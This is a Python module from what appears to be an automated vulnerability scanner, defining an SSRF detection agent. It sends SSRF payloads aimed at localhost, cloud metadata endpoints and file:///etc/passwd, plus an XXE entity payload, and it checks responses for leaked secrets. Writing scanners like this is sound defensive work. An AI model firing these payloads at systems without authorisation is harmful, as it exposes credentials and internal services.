"""
SSRF (Server-Side Request Forgery) detection agent
"""

import asyncio
from typing import List
import httpx
from itzraven.agents.base_agent import BaseAgent, AgentResult, Finding, AgentStatus
from itzraven.core.logger import get_logger

logger = get_logger()


class SSRFAgent(BaseAgent):
    """Agent for detecting SSRF vulnerabilities"""

    def __init__(self, target: str, event_bus=None, memory_manager=None):
        super().__init__("SSRF Agent", target, event_bus=event_bus, memory_manager=memory_manager)
        self.payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "file:///etc/passwd",
            "http://[::1]",
            "http://localhost:22",
            "http://localhost:3306",
            "http://internal.local",
        ]

    async def execute(self) -> AgentResult:
        """Execute SSRF testing"""
        logger.info(f"{self.name}: Testing {self.target}")

        await self._test_url_parameters()
        await self._test_file_upload()
        await self._run_nuclei_tags(tags=["ssrf", "server-side-request-forgery", "oob-ssrf"], severity="high")

        return AgentResult(
            agent_name=self.name,
            status=self.status,
            findings=self.findings,
            execution_time=0,
        )

    async def _test_url_parameters(self) -> None:
        """Test URL parameters for SSRF"""
        async with httpx.AsyncClient(timeout=15.0) as client:
            for payload in self.payloads:
                try:
                    # Test common parameter names
                    params = {
                        "url": payload,
                        "uri": payload,
                        "path": payload,
                        "dest": payload,
                        "redirect": payload,
                        "file": payload,
                    }

                    response = await client.get(self.target, params=params)

                    # Check for SSRF indicators
                    if self._detect_ssrf(response.text, response.status_code, payload):
                        self.add_finding(Finding(
                            title="SSRF vulnerability detected",
                            description=f"Server-side request forgery with payload: {payload}",
                            severity="critical",
                            category="ssrf",
                            evidence=f"Server made request to internal resource. Status: {response.status_code}",
                            proof_of_concept=f"GET {self.target}?url={payload}",
                            remediation="Validate and whitelist allowed URLs, block internal IPs",
                            confidence=0.8,
                        ))
                        break

                except httpx.TimeoutException:
                    # Timeout might indicate SSRF to slow internal service
                    logger.debug(f"Timeout with payload: {payload}")
                except Exception as e:
                    logger.debug(f"Error testing SSRF: {e}")

    async def _test_file_upload(self) -> None:
        """Test file upload for SSRF via XXE"""
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>
<root>&xxe;</root>"""

        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                files = {"file": ("test.xml", xxe_payload, "application/xml")}
                response = await client.post(self.target, files=files)

                if self._detect_ssrf(response.text, response.status_code, "localhost"):
                    self.add_finding(Finding(
                        title="SSRF via XXE in file upload",
                        description="XXE vulnerability allows SSRF attacks",
                        severity="critical",
                        category="ssrf",
                        evidence="Server processed external entity and made internal request",
                        proof_of_concept=f"POST {self.target} with XXE payload",
                        remediation="Disable external entity processing in XML parser",
                        confidence=0.85,
                    ))

            except Exception as e:
                logger.debug(f"Error testing XXE: {e}")

    def _detect_ssrf(self, response_text: str, status_code: int, payload: str) -> bool:
        """Detect SSRF indicators in response"""
        # Check for internal service responses
        ssrf_indicators = [
            "ssh-",  # SSH banner
            "mysql",  # MySQL
            "redis",  # Redis
            "mongodb",  # MongoDB
            "root:x:",  # /etc/passwd
            "ami-id",  # AWS metadata
            "instance-id",  # Cloud metadata
            "private-key",
        ]

        response_lower = response_text.lower()

        # Check if response contains internal service data
        if any(indicator in response_lower for indicator in ssrf_indicators):
            return True

        # Check for successful connection to internal service
        if "localhost" in payload and status_code == 200:
            return True

        return False
